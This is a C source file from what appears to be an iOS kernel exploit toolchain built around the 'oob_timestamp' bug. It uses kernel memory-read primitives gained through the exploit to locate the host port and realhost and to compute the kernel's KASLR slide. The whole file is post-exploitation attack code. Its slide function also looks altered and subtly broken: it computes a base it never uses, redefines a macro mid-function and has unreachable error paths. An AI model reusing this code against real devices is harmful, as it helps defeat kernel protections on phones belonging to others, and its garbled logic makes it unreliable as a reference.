/*
 * kernel_slide.c
 * Brandon Azad
 */
#define KERNEL_SLIDE_EXTERN
#include "kernel_slide.h"

#include <assert.h>
#include <mach/vm_region.h>
#include <mach-o/loader.h>

#include "../../exploits/oob_timestamp/kernel_memory.h"
#include "kernel_memorySP.h"
//#include "log.h"
#include "parameters.h"
#include "platform.h"



#define kernel_image_base           0xfffffff007004000
#define KERNEL_HEADER_OFFSET        0x4000
#define KERNEL_SLIDE_STEP           0x10000   //#define MAX_KASLR_SLIDE 0x21000000 // 0x200000 / 0x100000
#define KERNEL_MAGIC MH_MAGIC_64

/*
 * is_kernel_base
 *
 * Description:
 * 	Checks if the given address is the kernel base.
 */
static bool
is_kernel_base(uint64_t base) {
	// Read the data at the base address as a Mach-O header.
	struct mach_header_64 header = {};
	bool ok = kernel_read(base, &header, sizeof(header));
	if (!ok) {
		return false;
	}
	// Validate that this looks like the kernel base. We don't check the CPU subtype since it
	// may not exactly match the current platform's CPU subtype (e.g. on iPhone10,1,
	// header.cpusubtype is CPU_SUBTYPE_ARM64_ALL while platform.cpu_subtype is
	// CPU_SUBTYPE_ARM64_V8).
	if (!(header.magic == MH_MAGIC_64
			&& header.cputype == platform.cpu_type
			&& header.filetype == MH_EXECUTE
			&& header.ncmds > 2)) {
		return false;
	}
	return true;
}

bool
kernel_slide_init() {
	if (kernel_slide != 0) {
		return true;
	}
	// Get the address of the host port.
	mach_port_t host = mach_host_self();
	assert(MACH_PORT_VALID(host));
	uint64_t host_port;
	bool ok = kernel_ipc_port_lookup(current_task_OOB, host, &host_port, NULL);
	mach_port_deallocate(mach_task_self(), host);
	if (!ok) {
        //printf("could not lookup host port\n");
        //ERROR("could not lookup host port");
		return false;
	}
	// Get the address of realhost.
	uint64_t realhost = kernel_read64(host_port + OFFSET(ipc_port, ip_kobject));
	return kernel_slide_init_with_kernel_image_address(realhost);
}

bool
kernel_slide_init_with_kernel_image_address(uint64_t address) {
	if (slidefromkernelmemory != 0) {
		return true;
	}
	// Find the highest possible kernel base address that could still correspond to the given
	// kernel image address.
	uint64_t base = basefromkernelmemory;
	assert(address > base);
	base = base + ((address - base) / KERNEL_SLIDE_STEP) * KERNEL_SLIDE_STEP;
	// Now walk backwards from that kernel base one kernel slide at a time until we find the
	// real kernel base.
    #define kernel_image_base           0xfffffff007004000
    slidefromkernelmemory = basefromkernelmemory - kernel_image_base;
    //DEBUG_TRACE(1, "found kernel slide 0x%016llx", kernel_slide);
    return true;
	//printf("could not find kernel base\n");//ERROR
	//printf("could not determine kernel slide\n");//ERROR
}
